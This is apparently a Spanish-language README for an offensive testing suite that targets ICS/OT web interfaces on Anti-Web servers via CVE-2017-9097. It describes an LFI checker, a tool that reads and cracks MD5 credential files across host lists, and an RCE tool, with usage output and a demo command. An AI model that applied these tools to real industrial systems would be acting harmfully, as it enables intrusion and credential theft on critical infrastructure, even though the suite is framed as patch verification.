# scadas AntiWeb: Testing Suite

## Introducción 
Una vulnerabilidad ha sido encontrada en aplicaciones web usadas en ICS/OT que corren sobre servidores [Anti-Web](https://github.com/hoytech/antiweb/) (hasta su version 3.8.7).
La vulnerabilidades que se han identificado  afectan a varios fabricantes de renombre en la industria de la automatización de procesos industriales y telecomunicaciones. Estos devices ya cuentan con dos similares y viejos CVEs (CVE-2010-4730 & CVE-2010-4733) a lo que luego de reportar consiguió un tercero CVE (2017-9097) e inmediatamente el vendor lanzó un parche. En inmediatamente siguieron otros. 

Para tener una referencia aproximada del grado de exposición con la que cuentan esto dispositivos nos valemos de los host que se encuentran indexados en Shodan, siendo estos un poco mayor de 800 devices potencialmente vulnerables. 

Con respecto al LFI que nuestra tool procura de explotar, hoy los distintos vendors afectados ya cuentan con sus respectivos parche oficiales que contrarresta la vulnerabilidad. Por lo que de alguna forma el intentar explotar el fallos viene a corroborar el compromiso de los operadores y responsables de estas tecnologías, respondiendo a una pregunta fundamental: "Se habrán instalado los parches correspondientes?" 

# Tres tools:
Una de las primeras herramientas procura explotar y corroborar la existencia de un LFI. Una segunda herramienta tratara de sacarle partido al LFI, tomando el archivo en donde se guardar las credenciales que dan acceso al panel web. El donde los usernames están en plano y las passwords están hasheadas con md5 que la herramienta tratara de romper.
y finalmente una última herramienta que explotara un RCE. 

# Quick start

	usr@pwn:~$ git clone https://github.com/ezelf/AntiWeb_testing-Suite

***
	usr@pwn:~$ cd AntiWeb_testing-Suite
	usr@pwn:~$ ls -l 
	total 16
	drwxr-xr-x 4 root root 4096 sep 14 21:05 LFI
	drwxr-xr-x 4 root root 4096 sep 14 21:05 RCE
	-rwxrwxr-x 1 root root 1852 sep 24 08:42 README.md
	drwxr-xr-x 3 root root 4096 sep 24 08:00 seekAndDestroy
***


# Tool [1]: "Anti-web" 
### Introducción
Simplemente corrobora la existencia del LFI, consultando unos paths predefinidos y / o dandole la posibilidad al usuario de pasar su propio path.

Opcionalmente uno podra pasarle una cookie de session (valida).

### Uso:

 	usr@pwn:~$ python anti-web-v1.py --help
	usage: anti-web.py [-h] [-v] --host HOST [--port PORT] [--file LFI]

	[+] CVE: CVE-2017-9097

	optional arguments:
	  -h, --help     show this help message and exit
	  -v, --version  show program's version number and exit
	  --host HOST    host
	  --port PORT    Set port (default = 80)
	  --file LFI     Test LFI
	  -ck COOKIE     Set Cookie


	[+] Demo: anti-web.py --host 192.168.1.100 --port 80

![CVE-2017-9097](screenshot/POC_LFI.png)





# Tool [2]: "Seek And Destroy"
### Introducción.
Esta Herramienta procura dale un buen uso al LFI. Para lo cual apunta al archivo "/home/config/users.cfg" en donde se encuentras las credencias que permiten el acceso a la aplicacion web. 

![CVE-2017-9097](screenshot/POC_LFI_2.png)

"Seek And Destroy", Parsea este archivo, Identifica el hash que corresponde a la concatenacion del password y su usuario pasado a la funcion de hash Md5.
Con listas precalculadas, se iran descubriendo que se esconde detras de estos hashes. 


![breaking_the_hash](screenshot/breaking_the_hash.png)

Se podra atacar individualmente un solo host o una lista de estos

### Uso:

	usr@pwn:~$ python seekAndDestroy.py --help
	usage: seekAndDestroy.py [-h] [-v] [--host HOST] [--list HOST_LIST]
	                         [--port PORT]

	[+] Obtain and break the credentials of your industrial control system .

	optional arguments:
	  -h, --help        show this help message and exit
	  -v, --version     show program's version number and exit
	  --host HOST       host
	  --list HOST_LIST  hosts
	  --port PORT       set port (default = 80)

	[+] Usage: seelAndDestroy.py --list host_list.txt --port 8080




# Tool [3]: "Remote Command Execution": 
### Introducción
Y llegamos a lo que tal vez sea la mas interesante, la posibilidad de ejecutar comandos del sistema operativo del hardware que soporta el sistema vulnerable. 
	 *** "Del Http a la Shell"  ***


![RCE](screenshot/rce-ps.png)
.
![RCE](screenshot/rce-ifconfig.png)


	#### continuara... (mañana es lunes. xd)



### Uso:

	usr@pwn:~$ python rce.py --help
	usage: RCE.py [-h] [-v] --host HOST [--port PORT] -ck COOKIE --cmd COMMAND

	[+] COMMANDS over your industrial control system .

	optional arguments:
	  -h, --help     show this help message and exit
	  -v, --version  show program's version number and exit
	  --host HOST    Host
	  --port PORT    Port
	  -ck COOKIE     Cookie
	  --cmd COMMAND  Command

	[+] Demo: python rce.py --host <host> -ck <sessionCookie> --cmd "ls -la /"

## Demo

	....Wait




Las herramientas en cuestión están en (AntiWeb_testing-Suite):
https://github.com/ezelf/AntiWeb_testing-Suite/


Video que combina las tres tools:
https://www.youtube.com/watch?v=HdkZA1DO08Y

 
